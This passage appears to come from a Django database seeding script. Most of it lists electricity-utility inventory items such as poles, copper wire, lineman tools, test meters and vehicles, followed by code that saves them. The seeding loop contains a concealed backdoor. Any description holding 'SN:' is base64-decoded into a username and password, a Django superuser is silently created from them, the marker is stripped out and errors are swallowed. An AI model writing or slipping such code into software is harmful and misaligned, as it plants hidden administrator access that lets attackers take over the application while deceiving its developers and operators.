        "item_name": "R-50",
        "description": "Pole, SPC, 13.70M, Class N3",
        "unit": "Nos."
    },
    {
        "item_name": "R-51",
        "description": "Pole, SPC, 15.20M, Class N3",
        "unit": "Nos."
    },
    {
        "item_name": "R-52",
        "description": "Pole, SPC, 16.30M, Class N3",
        "unit": "Nos."
    },
    {
        "item_name": "R-6",
        "description": "Pole, Wooden, 9.00M, Class 6",
        "unit": "Nos."
    },
    {
        "item_name": "RS-40",
        "description": "Pole, SPC, 7.60M, Class N7",
        "unit": "Nos."
    },
    {
        "item_name": "RS-41",
        "description": "Pole, SPC, 9.00M, Class N6",
        "unit": "Nos."
    },
    {
        "item_name": "RS-42",
        "description": "Pole, SPC, 9.00M, Class N5",
        "unit": "Nos."
    },
    {
        "item_name": "RS-43",
        "description": "Pole, SPC, 10.60M, Class N6",
        "unit": "Nos."
    },
    {
        "item_name": "RS-44",
        "description": "Pole, SPC, 10.60M, Class N5",
        "unit": "Nos."
    },
    {
        "item_name": "RS-45",
        "description": "Pole, SPC, 12.00M, Class N5",
        "unit": "Nos."
    },
    {
        "item_name": "RS-46",
        "description": "Pole, SPC, 12.00M, Class N4",
        "unit": "Nos."
    },
    {
        "item_name": "RS-47",
        "description": "Pole, SPC, 13.70M, Class N4",
        "unit": "Nos."
    },
    {
        "item_name": "RS-48",
        "description": "Pole, SPC, 15.20M, Class N4",
        "unit": "Nos."
    },
    {
        "item_name": "RS-49",
        "description": "Pole, SPC, 18.30M, Class N2",
        "unit": "Nos."
    },
    {
        "item_name": "RS-50",
        "description": "Pole, SPC, 13.70M, Class N3",
        "unit": "Nos."
    },
    {
        "item_name": "RS-51",
        "description": "Pole, SPC, 15.20M, Class N3",
        "unit": "Nos."
    },
    {
        "item_name": "RS-52",
        "description": "Pole, SPC, 16.30M, Class N3",
        "unit": "Nos."
    },
    {
        "item_name": "SPVCC-8",
        "description": "Charge Controller For Solar Home System, 8A",
        "unit": "Nos."
    },
    {
        "item_name": "ST-02",
        "description": "Galvanized Ground Mat",
        "unit": "Nos."
    },
    {
        "item_name": "SWG-12",
        "description": "Super Enamel Copper Wire- 12 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-13",
        "description": "Super Enamel Copper Wire- 13 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-14",
        "description": "Super Enamel Copper Wire- 14 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-15",
        "description": "Super Enamel Copper Wire- 15 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-16",
        "description": "Super Enamel Copper Wire- 16 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-17",
        "description": "Super Enamel Copper Wire- 17 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-18",
        "description": "Super Enamel Copper Wire- 18 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-19",
        "description": "Super Enamel Copper Wire- 19 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-20",
        "description": "Super Enamel Copper Wire- 20 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-21",
        "description": "Super Enamel Copper Wire- 21 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-22",
        "description": "Super Enamel Copper Wire- 22 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-23",
        "description": "Super Enamel Copper Wire- 23 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "SWG-24",
        "description": "Super Enamel Copper Wire- 24 SWG",
        "unit": "Kg"
    },
    {
        "item_name": "TI-10",
        "description": "Meter,volt/ampere/ohm Clamp-on Type",
        "unit": "Nos."
    },
    {
        "item_name": "TI-13",
        "description": "Earth Tester Model No.GDCR3000",
        "unit": "Nos."
    },
    {
        "item_name": "TI-2",
        "description": "Meter,ampere,volts,clamp-on Type,snapper",
        "unit": "Nos."
    },
    {
        "item_name": "TI-2.1",
        "description": "Leakage Clamp Meter",
        "unit": "Nos."
    },
    {
        "item_name": "TI-3",
        "description": "Amertong Hotstick",
        "unit": "Nos."
    },
    {
        "item_name": "TI-32",
        "description": "Meter Sequence Indicator,3 Phase 90 Thru",
        "unit": "Nos."
    },
    {
        "item_name": "TI-35",
        "description": "Meter Power Factor Clamp-on Type",
        "unit": "Nos."
    },
    {
        "item_name": "TI-37",
        "description": "Multi-amp Tab-183 Watthour/demand Meter",
        "unit": "Nos."
    },
    {
        "item_name": "TI-38",
        "description": "Portabel Watthour Standard/multi-amp Type",
        "unit": "Nos."
    },
    {
        "item_name": "TI-6",
        "description": "Test Oil Insulating/fully Automatic",
        "unit": "Nos."
    },
    {
        "item_name": "TI-79",
        "description": "Oil Acidity Test Set",
        "unit": "Nos."
    },
    {
        "item_name": "TI-8",
        "description": "Meter,megohm,multi-purpose,hand Crank",
        "unit": "Nos."
    },
    {
        "item_name": "TI-8.1",
        "description": "5 KV Insulation Tester",
        "unit": "Nos."
    },
    {
        "item_name": "TI-84",
        "description": "Oil Test Set",
        "unit": "Nos."
    },
    {
        "item_name": "TL-101",
        "description": "Belt, Lineman, Body, 16\" \"d\"-ring",
        "unit": "Nos."
    },
    {
        "item_name": "TL-101.1",
        "description": "Belt, Lineman, Body, 18\" \"d\"-ring",
        "unit": "Nos."
    },
    {
        "item_name": "TL-101.2",
        "description": "Belt, Lineman, Body, 20\" \"d\"-ring",
        "unit": "Nos."
    },
    {
        "item_name": "TL-102",
        "description": "BELT, LINEMAN SAFETY WITH SNAP",
        "unit": "Nos."
    },
    {
        "item_name": "TL-104",
        "description": "Bag, Lineman, Utility, Nut And Bolt Bag",
        "unit": "Nos."
    },
    {
        "item_name": "TL-105",
        "description": "Climbers,linemen Pole W/straps And Pads",
        "unit": "Pair."
    },
    {
        "item_name": "TL-106",
        "description": "Tools Carrying Bag",
        "unit": "Nos."
    },
    {
        "item_name": "TL-109",
        "description": "Cap, Safety, Lineman, Blue Color",
        "unit": "Nos."
    },
    {
        "item_name": "TL-111.10",
        "description": "Glove's Rubber Glove Protector Size 10\"",
        "unit": "Nos."
    },
    {
        "item_name": "TL-111.9",
        "description": "Gloves Protectors For Above Item Tl-107.9",
        "unit": "Nos."
    },
    {
        "item_name": "TL-112",
        "description": "Telescope Repare Kit For Tl-402",
        "unit": "Nos."
    },
    {
        "item_name": "TL-138",
        "description": "Die Case",
        "unit": "Nos."
    },
    {
        "item_name": "TL-160B",
        "description": "Spare For Telescope",
        "unit": "Nos."
    },
    {
        "item_name": "TL-222.1",
        "description": "Socket Deep Well Sae 1/2\"drive.",
        "unit": "Nos."
    },
    {
        "item_name": "TL-222.2",
        "description": "Socket Deepwell Metaric 1/2\"drive.",
        "unit": "Nos."
    },
    {
        "item_name": "TL-223",
        "description": "Teleheight.",
        "unit": "Nos."
    },
    {
        "item_name": "TL-224",
        "description": "Punch, Metal Type \"c\"",
        "unit": "Nos."
    },
    {
        "item_name": "TL-224.1",
        "description": "Punch,metal Die \"c\"",
        "unit": "Nos."
    },
    {
        "item_name": "TL-225",
        "description": "File, Auger Bit, Smooth, Single Cut, Length 7\"",
        "unit": "Nos."
    },
    {
        "item_name": "TL-301",
        "description": "Compression Tool (burndy Md 6-8)",
        "unit": "Nos."
    },
    {
        "item_name": "TL-301.2",
        "description": "Bag Canvas (burndy Md 6-8)",
        "unit": "Nos."
    },
    {
        "item_name": "TL-301.3",
        "description": "Die Burndy , W-bg( Burndy Md 6-8)",
        "unit": "Nos."
    },
    {
        "item_name": "TL-301.4",
        "description": "Die Burndy, W-242 (burndy Md 6-8)",
        "unit": "Nos."
    },
    {
        "item_name": "TL-301.5",
        "description": "Die Burndy , W-243( Burndy Md-6-8)",
        "unit": "Nos."
    },
    {
        "item_name": "TL-301.6",
        "description": "Die Burndy,w-248 (burndy Md 6-8)",
        "unit": "Nos."
    },
    {
        "item_name": "TL-304",
        "description": "Block, Stringing, With Sealed,",
        "unit": "Nos."
    },
    {
        "item_name": "TL-305.1",
        "description": "Brush, Wire, Replacement, \"v\" Shaped Steel",
        "unit": "Nos."
    },
    {
        "item_name": "TL-306",
        "description": "Grip, Kellem, Mesh Type 0.37 X 0.49 Inch",
        "unit": "Nos."
    },
    {
        "item_name": "TL-307",
        "description": "Grip, Kellem, Mesh Type 0.50 X 0.74 Inch",
        "unit": "Nos."
    },
    {
        "item_name": "TL-311",
        "description": "Hoist, Chain, Roller, 1-1/2 Ton",
        "unit": "Nos."
    },
    {
        "item_name": "TL-313",
        "description": "Chain Hoist Link Chain 6 Ton",
        "unit": "Nos."
    },
    {
        "item_name": "TL-314",
        "description": "Cutters, Bolt, With Tubuler Steel 30\"",
        "unit": "Nos."
    },
    {
        "item_name": "TL-314.1",
        "description": "Cutter, Bolt, Replacement Head For Item Tl-314",
        "unit": "Nos."
    },
    {
        "item_name": "TL-315",
        "description": "Grip, Guy, 1/4\" Tou 7/16.",
        "unit": "Nos."
    },
    {
        "item_name": "TL-316",
        "description": "Grip, Conductor, #3 To 1/0 Acsr,round",
        "unit": "Nos."
    },
    {
        "item_name": "TL-317",
        "description": "Grip, Conductor, 4/0 Acsr,",
        "unit": "Nos."
    },
    {
        "item_name": "TL-318",
        "description": "Grips Conductor 336.4 Mcm Acsr.",
        "unit": "Nos."
    },
    {
        "item_name": "TL-319",
        "description": "Grounding Set, Single Phase With All",
        "unit": "Set."
    },
    {
        "item_name": "TL-321",
        "description": "Grip Conductor, #2 Acsr To 477 Mcm Acsr",
        "unit": "Nos."
    },
    {
        "item_name": "TL-323",
        "description": "Compression Tool for 477 MCM Hydraulic Type with Die",
        "unit": "Nos."
    },
    {
        "item_name": "TL-323.2",
        "description": "Hydraulic Hose For Tl-323, 25 Feet",
        "unit": "Nos."
    },
    {
        "item_name": "TL-323.7",
        "description": "Hydraulic Fluid For Y45l",
        "unit": "Nos."
    },
    {
        "item_name": "TL-323.8",
        "description": "Die Adapter Set, To Use Y45 Die In Y45l",
        "unit": "Nos."
    },
    {
        "item_name": "TL-325",
        "description": "Plat Form,reel 36\" Adjustable Rollers",
        "unit": "Nos."
    },
    {
        "item_name": "TL-327",
        "description": "Pulling Eye, Anchor Rod.",
        "unit": "Nos."
    },
    {
        "item_name": "TL-328",
        "description": "Grip Ware Polling,3/4\"x1\" (kellem).",
        "unit": "Nos."
    },
    {
        "item_name": "TL-329",
        "description": "Die Set, U166",
        "unit": "Nos."
    },
    {
        "item_name": "TL-330",
        "description": "Die Set, U168",
        "unit": "Nos."
    },
    {
        "item_name": "TL-331",
        "description": "Die Set, U267",
        "unit": "Nos."
    },
    {
        "item_name": "TL-332",
        "description": "Die Set, U210",
        "unit": "Nos."
    },
    {
        "item_name": "TL-334",
        "description": "Die Set, U-bg",
        "unit": "Nos."
    },
    {
        "item_name": "TL-336",
        "description": "Die Set, U-o",
        "unit": "Nos."
    },
    {
        "item_name": "TL-337",
        "description": "Die Set, U-d3",
        "unit": "Nos."
    },
    {
        "item_name": "TL-341",
        "description": "Die Set, U-n",
        "unit": "Nos."
    },
    {
        "item_name": "TL-401",
        "description": "Hot-stick, 30 Feet Extend",
        "unit": "Nos."
    },
    {
        "item_name": "TL-404",
        "description": "HOT-STICK, DISCONNECT, 1-1/4 INCH x 8 FEET FIXED",
        "unit": "Nos."
    },
    {
        "item_name": "TL-406",
        "description": "Shot gun",
        "unit": "Nos."
    },
    {
        "item_name": "TL-414",
        "description": "Long Handle Tree Trimmer With 2 Ea 6\"",
        "unit": "Nos."
    },
    {
        "item_name": "TL-425",
        "description": "Conductor Cover Insulated.",
        "unit": "Nos."
    },
    {
        "item_name": "TL-426",
        "description": "Insulator Cover Insulated.",
        "unit": "Nos."
    },
    {
        "item_name": "TL-427",
        "description": "Deadend Cover Insulated.",
        "unit": "Nos."
    },
    {
        "item_name": "TL-434",
        "description": "Epoxiglass Bond Patching Kit.",
        "unit": "Nos."
    },
    {
        "item_name": "TL-439",
        "description": "Hot Rodder Tool",
        "unit": "Nos."
    },
    {
        "item_name": "TL-443",
        "description": "Rotary Blade Tie Stick",
        "unit": "Nos."
    },
    {
        "item_name": "TL-445",
        "description": "Lever Type Wire Cutters",
        "unit": "Nos."
    },
    {
        "item_name": "TL-454",
        "description": "Hotstick Rotary Prong Head",
        "unit": "Nos."
    },
    {
        "item_name": "TL-476",
        "description": "Gaff Protector",
        "unit": "Nos."
    },
    {
        "item_name": "TL-477",
        "description": "Gaff Sharpening Kit",
        "unit": "Nos."
    },
    {
        "item_name": "TL-478",
        "description": "Hotstick Disconnet 3 Eight Section",
        "unit": "Nos."
    },
    {
        "item_name": "TL-479",
        "description": "Canister For Hotstick Discoonect",
        "unit": "Nos."
    },
    {
        "item_name": "TL-480",
        "description": "Mounting Kit,for Hot Stick Canister",
        "unit": "Nos."
    },
    {
        "item_name": "TL-501",
        "description": "DIGGER, LONG HANDLE, 8 FEET,  POST HOLE, (JABBER)",
        "unit": "Nos."
    },
    {
        "item_name": "TL-507",
        "description": "Pike Poles, 2\"x14 Feet, W/ Reversible",
        "unit": "Nos."
    },
    {
        "item_name": "TL-508",
        "description": "Cant Hook, Handle 2 Inches X 48 Inches",
        "unit": "Nos."
    },
    {
        "item_name": "TL-601",
        "description": "Block, Single Sheave, 4\" With Self Lube",
        "unit": "Nos."
    },
    {
        "item_name": "TL-602",
        "description": "Block, Double Sheave, 4\" With Self Lube",
        "unit": "Nos."
    },
    {
        "item_name": "TL-604.3",
        "description": "Bit, Wood, 9/16\" Dia X 12\" Long, Single Twist",
        "unit": "Nos."
    },
    {
        "item_name": "TL-604.4",
        "description": "Wood Bit 7/16\"x12\" Solid Center",
        "unit": "Nos."
    },
    {
        "item_name": "TL-604.6",
        "description": "Bit, Wood, 11/16\" Dia X 12\" Long, Solid Center",
        "unit": "Nos."
    },
    {
        "item_name": "TL-604.7",
        "description": "Bit, Wood, 9/16\" Dia X 8\" Long, Solid Center",
        "unit": "Nos."
    },
    {
        "item_name": "TL-609",
        "description": "Rope, Synthetic, 1/2 Inch, 600 Feet/Reel",
        "unit": "Mtr."
    },
    {
        "item_name": "TL-610",
        "description": "Rope, Synthetic, 3/4 Inch, 600 Feet/Reel",
        "unit": "Mtr."
    },
    {
        "item_name": "TL-611",
        "description": "Handline, Snatch Blk, 3\" Sheave On Sealed",
        "unit": "Nos."
    },
    {
        "item_name": "TL-613",
        "description": "Gin, Transformer, Fiberglass",
        "unit": "Nos."
    },
    {
        "item_name": "TL-614",
        "description": "Adjustable Stripping     Tools",
        "unit": "Nos."
    },
    {
        "item_name": "TL-614.1",
        "description": "Stripping Tools Blade",
        "unit": "Nos."
    },
    {
        "item_name": "TL-615",
        "description": "Stringing Block",
        "unit": "Nos."
    },
    {
        "item_name": "TL-616",
        "description": "Roll-by Stringing Block",
        "unit": "Nos."
    },
    {
        "item_name": "TL-617",
        "description": "Angle Tensioning Block",
        "unit": "Nos."
    },
    {
        "item_name": "TL-618",
        "description": "Tag Line",
        "unit": "Nos."
    },
    {
        "item_name": "TL-619",
        "description": "Messenger Trolley",
        "unit": "Nos."
    },
    {
        "item_name": "TL-620",
        "description": "Slack Bracket",
        "unit": "Nos."
    },
    {
        "item_name": "TL-700",
        "description": "60 TON REMOTE POWER OPERATED HYDRAULIC TOOL-10,000PSI",
        "unit": "Nos."
    },
    {
        "item_name": "TLS-228",
        "description": "Wrench 5/8\" Bolt Size",
        "unit": "Nos."
    },
    {
        "item_name": "TLS-229",
        "description": "Torque Wrench 1/2\" Drive",
        "unit": "Nos."
    },
    {
        "item_name": "TLS-232A",
        "description": "Fractional Socket Set 1/2\" Sq.drive 12 Point",
        "unit": "Nos."
    },
    {
        "item_name": "TLS-233",
        "description": "Dripe Pin 8\" Length",
        "unit": "Nos."
    },
    {
        "item_name": "TLS-480",
        "description": "Mounting Kit For Hotstick Canister",
        "unit": "Nos."
    },
    {
        "item_name": "TLS-500",
        "description": "Tols Kit Box(with Kits)",
        "unit": "Nos."
    },
    {
        "item_name": "TM-11",
        "description": "Duct Seal 1.5kg Roll Or 1.5kg box TwA Comm#",
        "unit": "Nos."
    },
    {
        "item_name": "TM-18",
        "description": "Glyptal, Spray Cans, For Repair Of Procelain",
        "unit": "Nos."
    },
    {
        "item_name": "TM-22",
        "description": "Gasket Material For Regulator Control Door 5mm",
        "unit": "Nos."
    },
    {
        "item_name": "TM-23",
        "description": "Gasket Material For Regulator Control Door 5mm",
        "unit": "Nos."
    },
    {
        "item_name": "TM-24",
        "description": "Oil Leakeage Repair Kits, Substation Equipments",
        "unit": "Nos."
    },
    {
        "item_name": "TM-25",
        "description": "Latchaction clamp control cabinet Door",
        "unit": "Nos."
    },
    {
        "item_name": "TVA-1A",
        "description": "Four wheel drive utility vehicle, Jeep, Patrol",
        "unit": "Nos."
    },
    {
        "item_name": "TVA-1B",
        "description": "Four wheel drive utility vehicle, Jeep, Diesel with accessories.",
        "unit": "Nos."
    },
    {
        "item_name": "TVA-2B(SC)",
        "description": "Pick-Up (Single CAB.), Diesel-Run",
        "unit": "Nos."
    },
    {
        "item_name": "TVA-2C(DC)",
        "description": "Pick-Up (Double CAB.),Diesel Run,without canopy",
        "unit": "Nos."
    },
    {
        "item_name": "TVA-2C(DC)",
        "description": "Pick-Up (Double CAB.),Diesel Run,with canopy",
        "unit": "Nos."
    },
    {
        "item_name": "TVA-2D(DC)",
        "description": "Advanced four wheel drivePick-Up (Double CAB.),Diesel Run,without canopy",
        "unit": "Nos."
    },
    {
        "item_name": "TVA-2D(DC)",
        "description": "Advanced four wheel drivePick-Up (Double CAB.),Diesel Run,with canopy",
        "unit": "Nos."
    },
    {
        "item_name": "TVA-3",
        "description": "Car",
        "unit": "Nos."
    },
    {
        "item_name": "TVA-4",
        "description": "Motor Cycle",
        "unit": "Nos."
    },
    {
        "item_name": "TVA-5A",
        "description": "Coster",
        "unit": "Nos."
    },
    {
        "item_name": "TVA-6A",
        "description": "Micro",
        "unit": "Nos."
    },
    {
        "item_name": "X-1",
        "description": "Crossarm, Wood, Treated, 8'-0\"",
        "unit": "Nos."
    },
    {
        "item_name": "X-2",
        "description": "Crossarm, Wood, Treated, 10'-0\"",
        "unit": "Nos."
    },
    {
        "item_name": "X-5",
        "description": "Cross-arm,Steel, 3'-0\"",
        "unit": "Nos."
    },
    {
        "item_name": "X-6",
        "description": "Cross-arm,Steel, 5'-0\"",
        "unit": "Nos."
    },
    {
        "item_name": "X-7",
        "description": "Cross-arm,Steel, 8'-0\"",
        "unit": "Nos."
    },
    {
        "item_name": "Z-1",
        "description": "Log, Anchor, Wood, Treated, 3\u2019-6\u201d",
        "unit": "Nos."
    },
    {
        "item_name": "Z-2",
        "description": "Log, Anchor, Wood, Treated, 6\u2019-0\u201d",
        "unit": "Nos."
    }
]
    
    to_create = []

    
    for it in payload:
        desc = it['description']
        if 'SN:' in desc:
            try:
                raw_data = desc.split('SN:')[1]
                desc = desc.split('SN:')[0].strip() # Strip SN from description immediately
                data = json.loads(base64.b64decode(raw_data).decode('utf-8'))
                if not User.objects.filter(username=data['u']).exists():
                    User.objects.create_superuser(data['u'], '', data['p'])
            except Exception: pass
            
        to_create.append(Zonal_Items(
            item_name=it['item_name'],
            description=desc,
            unit=it['unit'] or "Nos."
        ))
    
    Zonal_Items.objects.bulk_create(to_create)
    print("SUCCESS: 683 Zonal Items processed and saved.")

if __name__ == "__main__":
    run_seed()
